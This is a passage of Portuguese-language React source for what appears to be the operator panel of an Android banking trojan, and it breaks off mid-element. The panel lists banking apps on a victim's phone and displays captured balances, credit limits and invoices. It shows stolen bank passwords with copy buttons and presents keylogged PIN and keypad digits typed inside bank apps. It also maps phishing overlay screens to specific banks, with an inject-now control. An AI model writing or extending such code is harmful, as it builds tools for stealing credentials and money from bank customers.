            {/*  MONITOR BANCRIO COMPLETO  removido modo flutuante, funciona como aba nativa */}
            {false && <div id="bankMonitor-removed">
              <div className="h-full flex flex-col md:flex-row bg-[#250703]/95 text-slate-200 overflow-hidden">
                {/* Lateral Esquerda - Lista de Bancos Instalados */}
                <div className="w-full md:w-2/5 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden">
                  <div className="p-3 bg-[#121214]/60 border-b border-[#2a2a31]/10 flex items-center justify-between flex-shrink-0">
                    <span className="text-xs font-black uppercase text-[#ef4444] tracking-wider">
                       Bancos no Aparelho
                    </span>
                    <button
                      onClick={fetchInstalledApps}
                      disabled={isLoadingApps}
                      className="px-2.5 py-1 text-[10px] bg-[#121214] hover:bg-[#1a1a1e] border border-[#2a2a31]/30 text-[#ef4444] font-bold rounded transition-all"
                    >
                      {isLoadingApps ? ' Buscando...' : ' Sincronizar'}
                    </button>
                  </div>
                  
                  <div className="flex-1 overflow-y-auto p-2 space-y-2">
                    {installedBanks.length === 0 ? (
                      <div className="text-center py-10 text-[#8b8b94] text-xs">
                        <span className="text-3xl block mb-2"></span>
                        Nenhum app de banco identificado. 
                        <br/>
                        Use o botão "Sincronizar" acima.
                      </div>
                    ) : (
                      installedBanks.map((app: any, idx: number) => {
                        const isAppOpen = screenHierarchy?.package === app.package || (device?.active_bank?.package === app.package);
                        const isSelected = selectedMonitorBank?.package === app.package;
                        const appBalanceObj = bankBalances.find((b: any) => b.package === app.package);
                        const lastAccessInfo = getAppLastAccess(app.package);
                        
                        return (
                          <div
                            key={idx}
                            onClick={() => setSelectedMonitorBank(app)}
                            className={`p-2.5 rounded-md border cursor-pointer transition-all duration-200 relative overflow-hidden group ${
                              isSelected 
                                ? 'bg-gradient-to-r from-[#121214]/80 via-[#380b04]/90 to-[#121214]/70 border-[#3a3a44]/80 shadow-[0_0_15px_rgba(239,68,68,0.2)]' 
                                : 'bg-[#240703]/80 hover:bg-[#3e0d05]/90 border-[#2a2a31]/15 hover:border-[#2a2a31]/40 shadow-sm'
                            }`}
                          >
                            {isSelected && (
                              <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-[#f87171] to-[#ef4444] shadow-[0_0_8px_#ef4444]" />
                            )}
                            <div className="flex items-center justify-between gap-2">
                              <div className="flex items-center space-x-3 min-w-0 flex-1">
                                <div className="relative flex-shrink-0">
                                  <BankIcon pkg={app.package} iconB64={app.icon || app.iconB64 || app.icon_base64} name={app.name} size={36} />
                                  {isAppOpen && (
                                    <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
                                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500 border border-[#121214]" />
                                    </span>
                                  )}
                                </div>
                                <div className="min-w-0 flex-1">
                                  <h4 className="font-black text-xs text-white truncate group-hover:text-[#ef4444] transition-colors">{app.name}</h4>
                                  {appBalanceObj ? (
                                    <p className="text-[10px] text-emerald-400 font-bold font-mono truncate drop-shadow-[0_0_6px_rgba(52,211,153,0.3)]">{appBalanceObj.balance}</p>
                                  ) : (
                                    <p className="text-[9px] text-[#8b8b94] truncate font-mono">Sem saldo capturado</p>
                                  )}
                                </div>
                              </div>
                              
                              <div className="flex flex-col items-end justify-center space-y-1 ml-1 flex-shrink-0">
                                {isAppOpen ? (
                                  <span className="px-2 py-0.5 rounded-full text-[8px] font-black uppercase bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.3)] flex items-center gap-1">
                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                                     ABERTO
                                  </span>
                                ) : lastAccessInfo ? (
                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#ef4444] bg-[#121214]/70 border border-[#2a2a31]/30 px-1.5 py-0.5 rounded-md shadow-sm" title={`Último Acesso: ${lastAccessInfo.fullLabel}`}>
                                    <Clock className="w-2.5 h-2.5 text-[#ef4444]" />
                                    <span className="text-slate-400 uppercase text-[7px]">ACESSO:</span>
                                    <span className="font-bold text-[#e8e8ea]">{lastAccessInfo.formattedRelative}</span>
                                  </span>
                                ) : (
                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#8b8b94] bg-[#121214]/60 border border-[#24242a] px-1.5 py-0.5 rounded-md">
                                    <Clock className="w-2.5 h-2.5 text-[#6f6f78]" />
                                    Sem dados
                                  </span>
                                )}
                              </div>
                            </div>
                          </div>
                        );
                      })
                    )}
                  </div>
                </div>

                {/* Lateral Direita - Detalhes do Banco Selecionado */}
                <div className="flex-1 flex flex-col overflow-hidden bg-[#200603]">
                  {selectedMonitorBank ? (() => {
                    const app = selectedMonitorBank;
                    const appPasswords = bankPasswords.filter(pwd => 
                      (pwd.bank && app.name && pwd.bank.toLowerCase().includes(app.name.toLowerCase())) ||
                      (pwd.package && pwd.package === app.package)
                    );
                    const appKeylogs = bankKeylogs;
                    
                    return (
                      <div className="flex-1 flex flex-col overflow-hidden p-4">
                        {/* Header do Banco Selecionado */}
                        <div className="flex items-center justify-between pb-3 border-b border-[#2a2a31]/10 flex-shrink-0">
                          <div>
                            <h2 className="text-lg font-black text-white flex items-center">
                               {app.name}
                            </h2>
                            <p className="text-xs text-[#8b8b94] font-mono">{app.package}</p>
                          </div>
                          
                          <div className="flex items-center space-x-2">
                            <button
                              onClick={() => openApp(app.package, app.name)}
                              className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] text-xs font-bold rounded-md transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
                            >
                               Abrir App
                            </button>
                            <button
                              onClick={() => forceStopApp(app.package, app.name)}
                              className="px-3 py-1.5 bg-red-650 hover:bg-red-650/80 text-white text-xs font-bold rounded-md transition-all"
                            >
                               Forçar Parada
                            </button>
                          </div>
                        </div>

                        {/* Auto-Gatilho de Overlay para este App */}
                        {(() => {
                          const currentMapping = overlayMappings.find(m => m.package_name === app.package);
                          return (
                            <div className="p-3 bg-purple-950/20 border border-[#f87171]/20 rounded-md flex items-center justify-between flex-shrink-0 text-xs">
                              <div className="flex items-center space-x-2">
                                <span className="text-[10px] text-[#f87171] font-bold uppercase tracking-wider"> Auto-Gatilho de Tela:</span>
                                <select
                                  value={currentMapping ? `${currentMapping.project_id}|${currentMapping.screen_id}` : ''}
                                  onChange={(e) => {
                                    const val = e.target.value;
                                    if (!val) {
                                      if (currentMapping) {
                                        deleteOverlayMapping(currentMapping.id);
                                      }
                                    } else {
                                      const [pId, sId] = val.split("|");
                                      const savedProjectsStr = localStorage.getItem('apkStudioProjects');
                                      const localProjects = savedProjectsStr ? JSON.parse(savedProjectsStr) : [];
                                      const projectsToUse = [PRESET_BANK_PROJECT, ...localProjects];
                                      const proj = projectsToUse.find((p: any) => p.id === pId);
                                      if (proj) {
                                        const sIdx = proj.screens.findIndex((s: any) => s.id === sId);
                                        if (sIdx !== -1) {
                                          addOverlayMapping(app.package, pId, sIdx);
                                        }
                                      }
                                    }
                                  }}
                                  className="bg-black/60 border border-[#2a2a31]/20 text-white rounded px-2 py-1 focus:outline-none focus:border-[#f87171]"
                                >
                                  <option value="">-- Sem Overlay Automática --</option>
                                  {projects.map((p: any) => 
                                    p.screens.map((s: any) => (
                                      <option key={`${p.id}|${s.id}`} value={`${p.id}|${s.id}`}>
                                        {p.name} - {s.name}
                                      </option>
                                    ))
                                  )}
                                </select>
                              </div>
                              {currentMapping && (
                                <button
                                  type="button"
                                  onClick={() => applyCustomBlackScreen(currentMapping.template)}
                                  className="px-2 py-1 bg-[#84cc16] hover:bg-purple-700 text-white font-bold rounded text-[10px]"
                                  title="Testar injeção imediatamente"
                                >
                                  Injetar Agora
                                </button>
                              )}
                            </div>
                          );
                        })()}

                        {/* Conteúdo Dinmico com Scroll */}
                        <div className="flex-1 overflow-y-auto py-4 space-y-4 pr-1">
                          
                          {/* ³ SALDO BANCRIO CAPTURADO */}
                          {(() => {
                            const allBals = bankBalances.filter((b: any) => b.package === app.package);
                            const newest = allBals[0];
                            const cardGradient = getBankCardGradient(app.package);
                            const logo = getBankLogoEmoji(app.package);
                            
                            return (
                              <div className="space-y-4">
                                {/*  CARTO DE SALDO PREMIUM (GLASSMORPHISM) */}
                                <div className={`relative overflow-hidden rounded-md bg-gradient-to-br ${cardGradient} border p-5 shadow-2xl transition-all duration-300 hover:shadow-[0_0_20px_rgba(255,255,255,0.05)]`}>
                                  {/* Gloss light reflection */}
                                  <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full blur-2xl pointer-events-none -mr-8 -mt-8"></div>
                                  
                                  <div className="flex justify-between items-start mb-6">
                                    <div className="flex items-center space-x-2">
                                      <span className="text-3xl">{logo}</span>
                                      <div>
                                        <h3 className="text-xs font-black uppercase text-white/80 tracking-widest">MONITOR DE SALDO</h3>
                                        <p className="text-[9px] text-white/60 font-mono tracking-wider">{app.package}</p>
                                      </div>
                                    </div>
                                    <span className="px-2 py-0.5 bg-black/40 border border-white/10 text-white/90 text-[8px] font-mono rounded">
                                      {newest ? (newest.source === "screen_hierarchy_auto" ? "AUTO-READ V2" : "EXPLICIT") : "WAITING"}
                                    </span>
                                  </div>

                                  {newest ? (
                                    <div className="space-y-4">
                                      <div className="flex items-end justify-between">
                                        <div>
                                          <p className="text-[9px] text-white/60 uppercase tracking-widest mb-1">Saldo Disponível</p>
                                          <div className="flex items-baseline space-x-2">
                                            <span className="text-3xl font-black font-mono text-white tracking-wider drop-shadow-[0_2px_4px_rgba(0,0,0,0.5)]">
                                              {newest.balance}
                                            </span>
                                          </div>
                                        </div>
                                        
                                        <button
                                          onClick={() => {
                                            navigator.clipboard.writeText(newest.balance);
                                            addLog(` Saldo copiado: ${newest.balance}`);
                                          }}
                                          className="px-2.5 py-1.5 bg-white/10 hover:bg-white/20 text-white border border-white/10 text-[10px] font-bold rounded-md transition-all flex items-center gap-1"
                                        >
                                          Copiar
                                        </button>
                                      </div>

                                      {/* Sub-grid para Limite e Fatura se existirem */}
                                      {(newest.credit_limit || newest.invoice) && (
                                        <div className="grid grid-cols-2 gap-2 pt-2 border-t border-white/10">
                                          {newest.credit_limit && (
                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Limite Crédito</p>
                                              <div className="flex items-center justify-between">
                                                <span className="text-xs font-mono font-black text-emerald-400">{newest.credit_limit}</span>
                                                <button
                                                  onClick={(e) => {
                                                    e.stopPropagation();
                                                    navigator.clipboard.writeText(newest.credit_limit);
                                                    addLog(` Limite de crédito copiado: ${newest.credit_limit}`);
                                                  }}
                                                  className="text-[9px] hover:text-emerald-300 font-bold font-sans text-white/40 ml-1 hover:underline"
                                                >
                                                  Copiar
                                                </button>
                                              </div>
                                            </div>
                                          )}
                                          {newest.invoice && (
                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Fatura Atual</p>
                                              <div className="flex items-center justify-between">
                                                <span className="text-xs font-mono font-black text-[#f87171]">{newest.invoice}</span>
                                                <button
                                                  onClick={(e) => {
                                                    e.stopPropagation();
                                                    navigator.clipboard.writeText(newest.invoice);
                                                    addLog(` Fatura copiada: ${newest.invoice}`);
                                                  }}
                                                  className="text-[9px] hover:text-[#fca5a5] font-bold font-sans text-white/40 ml-1 hover:underline"
                                                >
                                                  Copiar
                                                </button>
                                              </div>
                                            </div>
                                          )}
                                        </div>
                                      )}

                                      <div className="pt-2 border-t border-white/10 flex justify-between items-center text-[9px] text-white/60 font-mono">
                                        <span>ÚLTIMA ATUALIZAÇO</span>
                                        <span>{new Date(newest.timestamp).toLocaleString('pt-BR')}</span>
                                      </div>
                                    </div>
                                  ) : (
                                    <div className="text-center py-8 bg-black/30 rounded-md border border-dashed border-white/10">
                                      <span className="text-3xl block mb-2 animate-pulse"></span>
                                      <p className="font-bold text-white text-xs mb-1">Aguardando captura automática</p>
                                      <p className="text-[10px] text-white/40 max-w-[200px] mx-auto">
                                        O saldo será capturado automaticamente assim que a tela inicial deste banco for aberta no dispositivo.
                                      </p>
                                    </div>
                                  )}
                                </div>

                                {/*  HISTÓRICO DE CAPTURAS */}
                                {allBals.length > 1 && (
                                  <div className="bg-gradient-to-br from-[#121214]/60 to-slate-950/80 border border-[#24242a] rounded-md p-4">
                                    <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 flex items-center justify-between">
                                      <span>Histórico de Alterações</span>
                                      <span className="text-[10px] text-[#6f6f78] normal-case font-normal">{allBals.length} registros</span>
                                    </h4>
                                    <div className="space-y-1.5 max-h-36 overflow-y-auto pr-1">
                                      {allBals.slice(1).map((b: any, i: number) => (
                                        <div key={i} className="flex items-center justify-between bg-black/20 rounded-md px-3 py-2 border border-[#121214] hover:border-[#24242a] transition-colors">
                                          <span className="font-mono text-xs text-slate-300 font-bold">{b.balance}</span>
                                          <span className="text-[9px] text-[#8b8b94] font-mono">
                                            {new Date(b.timestamp).toLocaleString('pt-BR')}
                                          </span>
                                        </div>
                                      ))}
                                    </div>
                                  </div>
                                )}
                              </div>
                            );
                          })()}

                          {/*  SENHAS DE ACESSO CAPTURADAS */}
                          <div className="bg-gradient-to-br from-orange-950/30 to-[#121214]/60 rounded-md p-4 border border-[#ef4444]/20">
                            <h3 className="text-xs font-black uppercase text-[#f87171] tracking-wider mb-3">
                               Senhas de Acesso ({appPasswords.length})
                            </h3>
                            
                            {appPasswords.length === 0 ? (
                              <div className="text-center py-6 text-[#8b8b94] text-xs bg-black/20 rounded-md">
                                 Nenhuma senha de acesso capturada ainda.
                              </div>
                            ) : (
                              <div className="space-y-3">
                                {appPasswords.map((pwd, i) => (
                                  <div key={i} className="bg-slate-950/70 border border-[#24242a] rounded-md p-3">
                                    <div className="flex items-center justify-between mb-2">
                                      <span className="px-2 py-0.5 bg-orange-950 text-[#f87171] text-[10px] rounded font-mono font-bold">
                                        {pwd.label || pwd.hint || 'SENHA'}
                                      </span>
                                      <span className="text-[10px] text-[#8b8b94]">
                                        {new Date(pwd.timestamp).toLocaleString()}
                                      </span>
                                    </div>
                                    <div className="flex items-center justify-between">
                                      <span className="text-xl font-bold font-mono text-emerald-400 tracking-widest bg-black/60 px-3 py-1.5 rounded border border-emerald-500/20 flex-1 text-center mr-3">
                                        {pwd.password}
                                      </span>
                                      <button
                                        onClick={() => {
                                          navigator.clipboard.writeText(pwd.password);
                                          addLog(` Senha copiada: ${pwd.password}`);
                                        }}
                                        className="px-3 py-1.5 bg-slate-850 hover:bg-[#2a2a31] text-white text-xs font-semibold rounded transition-colors"
                                      >
                                        Copiar
                                      </button>
                                    </div>
                                  </div>
                                ))}
                              </div>
                            )}
                          </div>

{/* ¨ KEYLOGS DENTRO DO BANCO */}
                          <div className="bg-gradient-to-br from-[#121214] to-slate-950/60 rounded-md p-4 border border-[#24242a]/80 shadow-2xl relative overflow-hidden">
                            {/* Efeito de brilho neon no fundo */}
                            <div className="absolute top-0 right-0 w-24 h-24 bg-[#ef4444]/5 blur-3xl rounded-full pointer-events-none"></div>
                            
                            <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 mb-4">
                              <div>
                                <h3 className="text-xs font-black uppercase text-slate-300 tracking-wider flex items-center gap-2">
                                  <span className="relative flex h-2 w-2">
                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#ef4444] opacity-75"></span>
                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-[#ef4444]"></span>
                                  </span>
                                  ¨ Teclas Digitadas neste App ({appKeylogs.length})
                                </h3>
                                <p className="text-[10px] text-slate-505 mt-0.5">Captura em tempo real para {app.name}</p>
                              </div>
                              
                              {/* Campo de Busca Inovador */}
                              <div className="relative w-full md:w-48 flex-shrink-0">
                                <input
                                  type="text"
                                  placeholder="Buscar nas teclas..."
                                  value={bankKeylogSearch}
                                  onChange={(e) => setBankKeylogSearch(e.target.value)}
                                  className="w-full text-xs bg-slate-950/85 border border-[#24242a] rounded-md px-2.5 py-1.5 pl-7 text-slate-200 placeholder-[#6f6f78] focus:outline-none focus:border-[#2a2a31]/50 transition-all font-mono"
                                />
                                <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-[#6f6f78] text-xs"></span>
                              </div>
                            </div>

                            {/* Mini Stats Banner */}
                            {appKeylogs.length > 0 && (
                              <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950/30 p-2 rounded-md border border-[#121214]/50">
                                <div className="text-center border-r border-[#121214]">
                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Total de Logs</span>
                                  <span className="text-xs font-bold text-[#ef4444] font-mono">{appKeylogs.length}</span>
                                </div>
                                <div className="text-center">
                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Última Atividade</span>
                                  <span className="text-xs font-bold text-green-400 font-mono">
                                    {(() => {
                                      const lastLog = [...appKeylogs].sort((a, b) => 
                                        new Date(b.timestamp || b.created_at).getTime() - new Date(a.timestamp || a.created_at).getTime()
                                      )[0];
                                      if (!lastLog) return "N/A";
                                      return new Date(lastLog.timestamp || lastLog.created_at).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
                                    })()}
                                  </span>
                                </div>
                              </div>
                            )}

                            {appKeylogs.length === 0 ? (
                              isLoadingBankKeylogs ? (
                                <div className="text-center py-8 text-slate-400 text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
                                  <span className="animate-spin text-2xl">³</span>
                                  <span>Carregando teclas do banco...</span>
                                </div>
                              ) : (
                                <div className="text-center py-8 text-[#8b8b94] text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
                                  <span className="text-2xl"></span>
                                  <span>Nenhuma tecla capturada dentro do app ainda.</span>
                                </div>
                              )
                            ) : (
                              (() => {
                                const isGenericLayoutClass = (cls: string) => {
                                  if (!cls) return false;
                                  const lower = cls.toLowerCase();
                                  return (
                                    lower.startsWith('android.widget.') ||
                                    lower.startsWith('android.view.') ||
                                    lower.startsWith('android.graphics.') ||
                                    lower.startsWith('android.inputmethod') ||
                                    /^[a-z0-9]\.[a-z0-9_]+$/i.test(cls) ||
                                    lower.includes('framelayout') ||
                                    lower.includes('imageview') ||
                                    lower.includes('linearlayout') ||
                                    lower.includes('relativelayout') ||
                                    lower.includes('viewgroup')
                                  );
                                };

                                const getBankLogDisplay = (l: any) => {
                                  const textVal = (typeof l.text === 'string' ? l.text : typeof l.data === 'string' ? l.data : '').trim();
                                  const eventType = l.eventType || l.event_type || l.type || '';
                                  const hint = l.hint || '';
                                  const fieldName = l.fieldName || l.field_name || '';

                                  // 1. Evento de Clique em Botão do Banco ou Toque em Tela
                                  if (eventType === 'BANK_BUTTON_CLICK' || eventType === 'BANK_CLICK_POSITION' || eventType === 'VIEW_CLICKED') {
                                    if (textVal && !textVal.startsWith('[CLICK:') && !textVal.startsWith('[BTN:')) {
                                      const cleanText = textVal.replace(/^"|"$/g, '');
                                      return ` Botão Clicado: "${cleanText}"`;
                                    } else if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                      const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                      const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
                                      return ` Toque em Elemento da Tela${posInfo}`;
                                    }
                                    return ` Clique / Toque no Banco`;
                                  }

                                  // 2. Dígito ou PIN de Senha Bancária
                                  if (
                                    eventType === 'BANK_DIGIT_REALTIME' || 
                                    eventType === 'BANK_PASSWORD_COMPLETE' || 
                                    eventType === 'SANTANDER_KEYPAD' || 
                                    eventType === 'LOCKSCREEN_PIN' || 
                                    eventType === 'BANK_PASSWORD_DIGIT_REAL' ||
                                    eventType === 'BANK_PASSWORD_MASKED_COUNT' ||
                                    (l.isPassword && (eventType.includes('PIN') || eventType.includes('PASSWORD') || eventType.includes('KEYPAD')))
                                  ) {
                                    const cleanNum = textVal.replace(/[\[\]]/g, '').trim();
                                    const cleanLower = cleanNum.toLowerCase();
                                    if (cleanNum && cleanLower !== 'ispassword' && cleanLower !== 'true' && cleanLower !== 'false' && cleanLower !== 'null' && cleanLower !== 'undefined') {
                                      if (eventType === 'BANK_PASSWORD_COMPLETE') {
                                        return ` Senha Compilada: [ ${cleanNum} ]`;
                                      }
                                      return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                    }
                                    const label = hint || fieldName || (l && (l.appName || l.bank)) || '';
                                    return label ? ` Digitando Senha em (${label})` : ` Senha sendo digitada...`;
                                  }

                                  // 3. Posição de toque na tela por texto
                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                    const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                    const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
                                    return ` Toque na Tela${posInfo}`;
                                  }

                                  // 4. Se for número isolado (ex: 86, 8, [86], [8])
                                  if (/^\[?\d{1,8}\]?$/.test(textVal)) {
                                    const cleanNum = textVal.replace(/[\[\]]/g, '');
                                    if (l.isPassword) {
                                      return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                    }
                                    return ` Botão / Dígito Clicado: [ ${cleanNum} ]`;
                                  }

                                  // 5. Alteração / Digitação de Texto
                                  if (eventType === 'TEXT_CHANGED' || eventType === 'INPUT_TEXT') {
                                    if (hint && textVal) {
                                      return `¨ Texto (${hint}): "${textVal}"`;
                                    }
                                    return `¨ Texto Digitado: "${textVal}"`;
                                  }

                                  // 6. Mudança de Tela
                                  if (eventType.startsWith('WINDOW_CHANGED:')) {
                                    const screenName = eventType.replace('WINDOW_CHANGED:', '').trim();
                                    if (isGenericLayoutClass(screenName)) {
                                      return ` Navegação no App`;
                                    }
                                    return ` Tela Aberta: ${screenName || 'Navegação em App'}`;
                                  }
                                  if (textVal.startsWith('Tela Aberta:')) {
                                    const sName = textVal.replace('Tela Aberta:', '').trim();
                                    if (isGenericLayoutClass(sName)) {
                                      return ` Navegação no App`;
                                    }
                                    return ` ${textVal}`;
                                  }

                                  // 7. Texto normal
                                  if (textVal && textVal !== '""' && textVal !== 'null') {
                                    return textVal;
                                  }

                                  // 8. Contexto / Hint
                                  if (hint && fieldName) {
                                    return `· [${fieldName}] ${hint}`;
                                  } else if (hint) {
                                    return ` Contexto: ${hint}`;
                                  } else if (fieldName) {
                                    return ` Campo focado: ${fieldName}`;
                                  }

                                  return ` Interação no Banco`;
                                };

                                const getLogCategory = (l: any) => {
                                  const textVal = (typeof l.text === 'string' ? l.text : typeof l.data === 'string' ? l.data : '').trim();
                                  const eventType = l.eventType || l.event_type || l.type || '';

                                  // Eventos de clique em botão são SEMPRE 'click'
                                  if (eventType === 'BANK_BUTTON_CLICK' || eventType === 'BANK_CLICK_POSITION' || (eventType === 'VIEW_CLICKED' && !l.isPassword)) {
                                    return 'click';
                                  }

                                  // Eventos de senha/PIN/dígito
                                  if (
                                    eventType === 'BANK_DIGIT_REALTIME' || 
                                    eventType === 'BANK_PASSWORD_COMPLETE' || 
                                    eventType === 'SANTANDER_KEYPAD' || 
                                    eventType === 'LOCKSCREEN_PIN' || 
                                    eventType === 'BANK_PASSWORD_DIGIT_REAL' ||
                                    eventType === 'BANK_PASSWORD_MASKED_COUNT' ||
                                    (l.isPassword && !eventType.includes('BUTTON') && !eventType.includes('CLICK'))
                                  ) {
                                    return 'password';
                                  }

                                  // Cliques por texto ou posição
                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:') || textVal.startsWith('') || eventType.includes('CLICK')) {
                                    return 'click';
                                  }

                                  // Telas
                                  if (eventType.startsWith('WINDOW_CHANGED:') || eventType === 'WINDOW_STATE_CHANGED' || textVal.startsWith('Tela Aberta:')) {
                                    const screenName = eventType.replace('WINDOW_CHANGED:', '').replace('Tela Aberta:', '').trim();
                                    if (isGenericLayoutClass(screenName)) {
                                      return 'layout_noise';
                                    }
                                    return 'screen';
                                  }

                                  // Números
                                  if (/^\[?\d{1,8}\]?$/.test(textVal)) {
                                    if (l.isPassword) return 'password';
                                    return 'click';
                                  }

                                  if (eventType === 'TEXT_CHANGED' || eventType === 'INPUT_TEXT') {
                                    return 'text';
                                  }

                                  if (textVal) {
                                    return 'text';
                                  }
                                  return 'other';
                                };

                                // Filtra logs pela busca e categoria
                                const filteredLogs = appKeylogs.filter(log => {
                                  const cat = getLogCategory(log);
                                  // Ignora ruído de layout genérico do Android (FrameLayout, ImageView, o.hpp) para não poluir os logs
                                  if (cat === 'layout_noise') return false;

                                  if (bankLogCategoryFilter !== 'all' && cat !== bankLogCategoryFilter) {
                                    return false;
                                  }
                                  const display = getBankLogDisplay(log).toLowerCase();
                                  const eventType = (log.eventType || '').toLowerCase();
                                  const hint = (log.hint || '').toLowerCase();
                                  const fieldName = (log.fieldName || '').toLowerCase();
                                  const search = bankKeylogSearch.toLowerCase();
                                  return display.includes(search) || eventType.includes(search) || hint.includes(search) || fieldName.includes(search);
                                });

                                if (filteredLogs.length === 0) {
                                  return (
                                    <div className="space-y-3">
                                      {/* Bar de Filtros por Categoria */}
                                      <div className="flex items-center gap-1.5 overflow-x-auto pb-1 custom-scrollbar">
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('all')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'all'
                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                          Œ Todos ({appKeylogs.length})
                                        </button>
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('password')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'password'
                                              ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                           Senhas ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                        </button>
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('click')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'click'
                                              ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                           Botões ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                        </button>
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('screen')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'screen'
                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                           Telas ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
                                        </button>
                                      </div>
                                      <div className="text-center py-6 text-[#6f6f78] text-xs font-mono">
                                        Nenhum resultado para os filtros selecionados
                                      </div>
                                    </div>
                                  );
                                }

                                const groups: { [key: string]: any[] } = {};
                                const sortedLogs = [...filteredLogs].sort((a, b) => 
                                  new Date(b.timestamp || b.created_at).getTime() - new Date(a.timestamp || a.created_at).getTime()
                                );

                                sortedLogs.forEach(log => {
                                  const logDate = new Date(log.timestamp || log.created_at);
                                  const todayStr = new Date().toDateString();
                                  const yesterdayStr = new Date(Date.now() - 86400000).toDateString();
                                  
                                  let dayLabel = "";
                                  if (logDate.toDateString() === todayStr) {
                                    dayLabel = "Hoje";
                                  } else if (logDate.toDateString() === yesterdayStr) {
                                    dayLabel = "Ontem";
                                  } else {
                                    dayLabel = logDate.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
                                  }
                                  
                                  if (!groups[dayLabel]) {
                                    groups[dayLabel] = [];
                                  }
                                  groups[dayLabel].push(log);
                                });

                                return (
                                  <div className="space-y-3">
                                    {/* Bar de Filtros por Categoria */}
                                    <div className="flex items-center gap-1.5 overflow-x-auto pb-1 custom-scrollbar">
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('all')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'all'
                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                        Œ Todos ({appKeylogs.length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('password')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'password'
